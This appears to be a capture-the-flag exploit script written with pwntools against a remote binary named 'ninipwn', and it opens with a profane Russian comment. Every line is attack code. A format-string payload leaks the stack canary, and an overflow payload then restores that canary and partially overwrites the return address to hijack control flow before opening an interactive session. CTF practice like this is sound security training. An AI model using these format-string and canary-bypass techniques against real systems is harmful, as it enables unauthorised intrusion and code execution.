#нихуя не понял

from pwn import *

# p = process("./ninipwn", level="debug")
p = remote("3.75.185.198",7000, level="debug")

p.recvuntil(b"Text length: ")
pause()
p.sendline(b"4")

p.recvuntil(b"Key: ")
payload = b"%39$pAAA\x19\x01" # fsb
p.send(payload)

p.recvuntil(b"Key selected: ")

canary = int(p.recvn(18),16)
log.info(f"canary: {hex(canary)}")


payload = b"A"*256
payload += b"B"*8
payload += p64(canary ^ 0x4141417024393325)
payload += b"C"*8
payload += p8(0x33 ^ 0x25)

p.recvuntil(b"Text: ")
p.send(payload)

p.interactive()